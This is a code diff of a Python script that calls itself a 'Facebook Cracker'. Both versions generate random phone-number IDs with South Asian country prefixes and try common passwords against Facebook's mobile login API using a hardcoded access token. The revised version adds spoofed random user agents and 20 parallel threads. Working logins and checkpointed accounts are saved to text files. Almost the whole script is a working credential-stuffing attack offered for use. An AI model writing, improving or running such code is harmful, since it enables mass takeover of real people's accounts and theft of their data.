@@ -1,134 +1,122 @@
-import os, sys, time, requests, random
-from datetime import datetime
-from time import sleep
+#----------------------------[IMPORTS]--------------------------------#
+import requests, json, os, sys, random, datetime, time, re
+from bs4 import BeautifulSoup as bs
+from concurrent.futures import ThreadPoolExecutor
+import socket
 
-#------------------[ PASSWORD PROTECTION ]------------------#
-password = "9774943"
+#----------------------------[COLORS]--------------------------------#
+A = '\x1b[1;97m'; R = '\x1b[38;5;196m'; G = '\x1b[38;5;46m'
+B = '\x1b[38;5;8m'; Y = '\033[1;33m'; X = '\33[1;34m'; S = '\x1b[1;96m'
 
-def check_password():
+#----------------------------[DATE & TIME]--------------------------------#
+now = datetime.datetime.now()
+current_time = now.strftime("%H:%M:%S")
+current_date = now.strftime("%d-%B-%Y")
+
+#----------------------------[IP ADDRESS]--------------------------------#
+def get_ip():
+    try:
+        return requests.get("https://api64.ipify.org?format=json").json()["ip"]
+    except:
+        return "No Internet"
+
+#----------------------------[LOGO]--------------------------------#
+logo = f"""
+{G}      ANONYMOUS CYBER
+{A}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{Y}  Developer : Abd Ur Rab
+{Y}  Tool Name : Facebook Cracker
+{Y}  Version   : 1.0
+{Y}  Status    : Active
+{Y}  Date      : {current_date}
+{Y}  Time      : {current_time}
+{Y}  IP        : {get_ip()}
+{A}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"""
+
+#----------------------------[COUNTRY SELECTION]--------------------------------#
+def select_country():
     os.system("clear")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;97m  WELCOME TO ABD UR RAB FACEBOOK CRACKER")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    user_pass = input("\n\033[1;97mENTER PASSWORD: ")
-    if user_pass != password:
-        print("\n\033[1;91mWRONG PASSWORD! TRY AGAIN.\033[1;97m")
-        sleep(2)
-        check_password()
-    else:
-        print("\n\033[1;92mACCESS GRANTED! LOADING TOOL...\033[1;97m")
-        sleep(2)
-
-check_password()
-
-#------------------[ TOOL INFO ]------------------#
-def tool_info():
-    os.system("clear")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;97m   FACEBOOK CLONING TOOL BY ABD UR RAB")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;97mTOOL VERSION    : \033[1;92mV1.0")
-    print("\033[1;97mTOOL OWNER      : \033[1;92mABD UR RAB")
-    print("\033[1;97mTOOL STATUS     : \033[1;92mACTIVE")
-    print("\033[1;97mCURRENT TIME    : \033[1;92m" + datetime.now().strftime("%H:%M:%S"))
-    print("\033[1;97mYOUR IP ADDRESS : \033[1;92m" + requests.get("https://api64.ipify.org").text)
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    sleep(3)
-
-tool_info()
-
-#------------------[ COUNTRY SELECTION ]------------------#
-def country_selection():
-    os.system("clear")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;97m  SELECT YOUR COUNTRY")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;97m[1] PAKISTAN")
-    print("\033[1;97m[2] AFGHANISTAN")
-    print("\033[1;97m[3] INDIA")
-    print("\033[1;97m[4] BANGLADESH")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(logo)
+    print(f"{G}[1] {A}Pakistan")
+    print(f"{G}[2] {A}Afghanistan")
+    print(f"{G}[3] {A}India")
+    print(f"{G}[4] {A}Bangladesh")
+    print(f"{G}[5] {A}Exit")
     
-    choice = input("\n\033[1;97mSELECT COUNTRY: ")
+    choice = input(f"{G}Select Country: {A}")
     
     if choice == "1":
-        country = "PAKISTAN"
-        code = "92"
+        return "PAK", "923"
     elif choice == "2":
-        country = "AFGHANISTAN"
-        code = "93"
+        return "AFG", "937"
     elif choice == "3":
-        country = "INDIA"
-        code = "91"
+        return "IND", "91"
     elif choice == "4":
-        country = "BANGLADESH"
-        code = "880"
+        return "BD", "880"
+    elif choice == "5":
+        exit()
     else:
-        print("\n\033[1;91mINVALID CHOICE! TRY AGAIN.\033[1;97m")
-        sleep(2)
-        country_selection()
-    
-    print(f"\n\033[1;92mYOU SELECTED: {country} ({code})\033[1;97m")
-    sleep(2)
-    return code
+        print(f"{R}Invalid Choice! Try Again...")
+        time.sleep(2)
+        return select_country()
 
-code = country_selection()
+#----------------------------[USER-AGENT]--------------------------------#
+def random_ua():
+    return f"Mozilla/5.0 (Linux; Android {random.randint(7,12)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,115)}.0.{random.randint(4000,5000)}.0 Mobile Safari/537.36"
 
-#------------------[ RANDOM USER GENERATION ]------------------#
-def generate_users():
-    os.system("clear")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;97m  ENTER NUMBER OF IDS TO GENERATE")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+#----------------------------[FACEBOOK LOGIN]--------------------------------#
+def facebook_login(uid, password):
+    headers = {
+        "User-Agent": random_ua(),
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-FB-HTTP-Engine": "Liger"
+    }
     
-    limit = input("\n\033[1;97mENTER LIMIT (e.g. 10000): ")
+    url = f"https://b-api.facebook.com/method/auth.login?email={uid}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
     
     try:
-        limit = int(limit)
-    except:
-        print("\n\033[1;91mINVALID INPUT! TRY AGAIN.\033[1;97m")
-        sleep(2)
-        generate_users()
-    
-    print("\n\033[1;92mGENERATING IDS... PLEASE WAIT.\033[1;97m")
-    sleep(3)
-    
-    user_list = []
-    for _ in range(limit):
-        user_list.append(code + str(random.randint(1000000000, 1999999999)))
-    
-    return user_list
-
-user_list = generate_users()
-
-#------------------[ CRACK FACEBOOK IDS ]------------------#
-def facebook_crack():
-    os.system("clear")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;97m  STARTING FACEBOOK CLONING")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(f"\033[1;97mTOTAL IDS: {len(user_list)}")
-    print("\033[1;97mMETHOD: B-API & MBASIC")
-    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    
-    success = []
-    
-    for user in user_list:
-        for password in ["123456", "12345678", "123456789", "password", "pakistan"]:
-            session = requests.Session()
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F)",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Content-Type": "application/x-www-form-urlencoded"
-            }
-            response = session.get(f"https://b-api.facebook.com/method/auth.login?email={user}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32", headers=headers).json()
+        session = requests.Session()
+        response = session.get(url, headers=headers).json()
+        
+        if "session_key" in response:
+            print(f"{G}[SUCCESS] {uid} | {password}")
+            open("success.txt", "a").write(uid + "|" + password + "\n")
+        elif "www.facebook.com" in response.get("error_msg", ""):
+            print(f"{Y}[CHECKPOINT] {uid} | {password}")
+            open("checkpoint.txt", "a").write(uid + "|" + password + "\n")
+        else:
+            print(f"{R}[FAILED] {uid} | {password}")
             
-            if "session_key" in response:
-                print(f"\n\033[1;92m[SUCCESS] {user} | {password}\033[1;97m")
-                success.append(f"{user} | {password}")
-                open("successful_ids.txt", "a").write(f"{user} | {password}\n")
-                break
-    
-    print("\n\033[1;92mCLONING COMPLETE! CHECK 'successful_ids.txt' FOR RESULTS.\033[1;97m")
+    except requests.exceptions.ConnectionError:
+        print(f"{R}No Internet Connection!")
 
-facebook_crack()
+#----------------------------[MAIN FUNCTION]--------------------------------#
+def main():
+    os.system("clear")
+    print(logo)
+    
+    country_code, prefix = select_country()
+    
+    limit = int(input(f"{G}Enter Number of IDs to Generate: {A}"))
+    
+    user_ids = []
+    for _ in range(limit):
+        user_ids.append(prefix + str(random.randint(1000000, 9999999)))
+
+    passwords = ["123456", "password", "pakistan", "786786", "112233"]
+    
+    os.system("clear")
+    print(logo)
+    print(f"{G}Total IDs: {A}{limit}")
+    print(f"{G}Cracking Started... Please Wait!")
+    
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        for uid in user_ids:
+            for pw in passwords:
+                executor.submit(facebook_login, uid, pw)
+
+#----------------------------[START]--------------------------------#
+if __name__ == "__main__":
+    main()
